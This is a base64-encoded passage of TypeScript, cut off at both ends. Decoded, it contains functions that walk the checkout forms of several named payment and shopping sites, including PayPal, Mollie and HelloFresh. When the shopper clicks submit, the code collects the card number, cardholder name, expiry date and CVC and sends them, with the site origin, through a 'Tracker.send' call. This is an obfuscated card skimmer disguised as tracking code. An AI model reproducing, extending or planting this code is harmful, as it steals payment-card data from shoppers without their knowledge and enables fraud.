ICAnY2FyZENWQyc6IHBheW1lbnRNZXRob2REYXRhWzVdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgLy9lbGVtZW50cyA9IFtdO1xuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSk7XG4gICAgfVxuXG4gICAgZXhwbG9yZVBheWdhdGVQYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcbiAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJyB8fCBfY2hpbGRFbGVtZW50LnR5cGUgPT09ICdyYWRpbycpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyB8fCBfY2hpbGRFbGVtZW50LnR5cGUgPT09ICdyYWRpbycpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfY2hpbGRFbGVtZW50LCBlbGVtZW50cyk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXlnYXRlUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBleHBsb3JlU3VuZGF5UGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XG4gICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2Zvcm1FbGVtZW50KSB7XG4gICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5pZCA9PT0gXCJvbmUtc3RlcC1jaGVja291dC1mb3JtXCIpIHtcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xuICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVN1bmRheVBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfX2Zvcm1FbGVtZW50LCBlbGVtZW50cywgZnVuY3Rpb24gKGNvbnRyb2xsZXI6IGFueSwgZWxlbWVudHM6IGFueVtdKSB7XG4gICAgICAgICAgICAgICAgICAgIGNvbnRyb2xsZXIuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBsZXQgcGF5bWVudE1ldGhvZERhdGE6IGFueSA9IFtdO1xuXG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2NoaWxkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ25hbWUnOiBfX2NoaWxkRWxlbWVudC5uYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2NoaWxkRWxlbWVudC52YWx1ZSxcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IC8qcGF5bWVudE1ldGhvZERhdGFbNl0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs2XS52YWx1ZSA6Ki8gJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHBheW1lbnRNZXRob2REYXRhWzVdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbNV0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAvL2VsZW1lbnRzID0gW107XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICB9XG5cbiAgICBleHBsb3JlU3VuZGF5UGF5bWVudEZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIF9fZm9ybUVsZW1lbnQ6IGFueSwgZWxlbWVudHM6IGFueVtdLCBjYWxsYmFjazogKGFyZzA6IGFueSwgYXJnMTogYW55KSA9PiB2b2lkKSB7XG4gICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX2NoaWxkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlICE9PSAnaGlkZGVuJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfY2hpbGRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVN1bmRheVBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfY2hpbGRFbGVtZW50LCBlbGVtZW50cywgY2FsbGJhY2spO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgZXhwbG9yZU1vbGxpZVBheW1lbnRDb250YWluZXIoc2VsZjogdGhpcykge1xuICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykuZm9yRWFjaChmdW5jdGlvbiAoX19mb3JtRWxlbWVudCkge1xuICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuaWQgPT09IFwiYm9keVwiKSB7XG4gICAgICAgICAgICAgICAgbGV0IGVsZW1lbnRzOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVNb2xsaWVQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX19mb3JtRWxlbWVudCwgZWxlbWVudHMsIGZ1bmN0aW9uIChjb250cm9sbGVyOiBhbnksIGVsZW1lbnRzOiBhbnlbXSkge1xuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2REYXRhOiBhbnkgPSBbXTtcblxuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19jaGlsZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogX19jaGlsZEVsZW1lbnQubmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19jaGlsZEVsZW1lbnQudmFsdWUsXG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IHBheW1lbnRNZXRob2REYXRhWzFdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUgOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAvKnBheW1lbnRNZXRob2REYXRhWzZdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbNl0udmFsdWUgOiovICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzBdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNhcmRFeHBpcmVcIjogcGF5bWVudE1ldGhvZERhdGFbNF0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kRGF0YVs1XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzVdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICAgICAgLy9lbGVtZW50cyA9IFtdO1xuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSk7XG4gICAgfVxuXG4gICAgZXhwbG9yZU1vbGxpZVBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBhbnksIGVsZW1lbnRzOiBhbnlbXSwgY2FsbGJhY2s6IChhcmcwOiBhbnksIGFyZzE6IGFueSkgPT4gdm9pZCkge1xuICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9jaGlsZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfY2hpbGRFbGVtZW50LCBlbGVtZW50cyk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVNb2xsaWVQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX2NoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIGV4cGxvcmVBbmNob3JPbmx5KHNlbGY6IHRoaXMsIHBhcmVudE5vZGU6IGFueSwgbGlzdElkOiBzdHJpbmcsIGNhbGxiYWNrOiAoYXJnMDogYW55KSA9PiB2b2lkKSB7XG4gICAgICAgIGlmIChwYXJlbnROb2RlLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBwYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgIGlmIChfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0EnICYmIF9fZGV0ZWN0ZWRFbGVtZW50LmdldEF0dHJpYnV0ZSgnZGF0YS10eG5pZCcpID09PSBsaXN0SWQpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfX2RldGVjdGVkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVBbmNob3JPbmx5KHNlbGYsIF9fZGV0ZWN0ZWRFbGVtZW50LCBsaXN0SWQsIGNhbGxiYWNrKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIGV4cGxvcmVBbmNob3JPbmx5QnlIcmVmKHNlbGY6IHRoaXMsIHBhcmVudE5vZGU6IGFueSwgbGlzdElkOiBzdHJpbmcsIGNhbGxiYWNrOiAoYXJnMDogYW55KSA9PiB2b2lkKSB7XG4gICAgICAgIGlmIChwYXJlbnROb2RlLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICBwYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgIGlmIChfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0EnICYmIF9fZGV0ZWN0ZWRFbGVtZW50LmhyZWYuaW5kZXhPZihsaXN0SWQpICE9PSAtMSkge1xuICAgICAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9fZGV0ZWN0ZWRFbGVtZW50KTtcbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZUFuY2hvck9ubHlCeUhyZWYoc2VsZiwgX19kZXRlY3RlZEVsZW1lbnQsIGxpc3RJZCwgY2FsbGJhY2spO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0pO1xuICAgICAgICB9XG4gICAgfVxuXG4gICAgZXhwbG9yZVBheW1lbnRJbnB1dFRhZ09ubHkoc2VsZjogdGhpcywgZWxlbWVudFBhcmVudE5vZGU6IEhUTUxFbGVtZW50LCBjYWxsYmFjazogYW55KSB7XG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xuICAgICAgICAgICAgICAgIGlmIChfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkudHlwZSA9PT0gJ3N1Ym1pdCcpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYWxsYmFjaygoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkpO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnT25seShzZWxmLCAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLCBjYWxsYmFjaylcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIGV4cGxvcmVQYXlQYWxQYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgX19jcmVkaXRDYXJkRm9ybUVsZW1lbnQ6IGFueSwgZWxlbWVudHM6IGFueVtdLCBjYWxsYmFjazogKGFyZzA6IGFueSwgYXJnMTogYW55KSA9PiB2b2lkKSB7XG4gICAgICAgIGlmIChfX2NyZWRpdENhcmRGb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgX19jcmVkaXRDYXJkRm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfZm9ybUNoaWxkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgaWYgKF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyB8fCBfZm9ybUNoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJyAmJlxuICAgICAgICAgICAgICAgICAgICAgICAgX2Zvcm1DaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicgJiYgX2Zvcm1DaGlsZEVsZW1lbnQuaWQgIT09ICdiaWxsaW5nQWRkcmVzc0lkJykge1xuICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMucHVzaChfZm9ybUNoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgaWYgKF9mb3JtQ2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJyAmJiBfZm9ybUNoaWxkRWxlbWVudC50eXBlID09PSAnc3VibWl0Jykge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX2Zvcm1DaGlsZEVsZW1lbnQsIGVsZW1lbnRzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheVBhbFBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfZm9ybUNoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIGV4cGxvcmVIZWxsb0ZyZXNoUGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzLCBwYXJlbnROb2RlOiBhbnksIGNhbGxiYWNrOiBhbnkpIHtcbiAgICAgICAgcGFyZW50Tm9kZS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fZWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICBpZiAoX19lbGVtZW50Lm5vZGVOYW1lID09PSAnQlVUVE9OJyAmJiBfX2VsZW1lbnQuZ2V0QXR0cmlidXRlKCdkYXRhLXRlc3QtaWQnKSA9PT0gJ2FkZC1wYXltZW50LW1ldGhvZC1zYXZlJykge1xuICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhfX2VsZW1lbnQpO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlSGVsbG9GcmVzaFBheW1lbnRDb250YWluZXIoc2VsZiwgX19lbGVtZW50LCBjYWxsYmFjayk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGV4cGxvcmVCZXN0U2VjcmV0UGF5bWVudENvbnRhaW5lcihzZWxmOiB0aGlzKSB7XG4gICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX2Zvcm1FbGVtZW50KSB7XG4gICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5pZCA9PT0gXCJjcmVkaXRGb3JtXCIpIHtcbiAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xuICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZUJlc3RTZWNyZXRQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX19mb3JtRWxlbWVudCwgZWxlbWVudHMsIGZ1bmN0aW9uIChjb250cm9sbGVyOiBhbnksIGVsZW1lbnRzOiBhbnlbXSkge1xuICAgICAgICAgICAgICAgICAgICBjb250cm9sbGVyLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2REYXRhOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19jaGlsZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fY2hpbGRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fY2hpbGRFbGVtZW50Lm5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fY2hpbGRFbGVtZW50LnZhbHVlLFxuXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kRGF0YVsxXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzFdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUgPyBwYXltZW50TWV0aG9kRGF0YVswXS52YWx1ZSA6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiBwYXltZW50TWV0aG9kRGF0YVs0XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzRdLnZhbHVlIDogJ1Vua25vd24nLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNhcmRFeHBpcmVcIjogcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUgKyAnLycgKyBwYXltZW50TWV0aG9kRGF0YVszXS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVu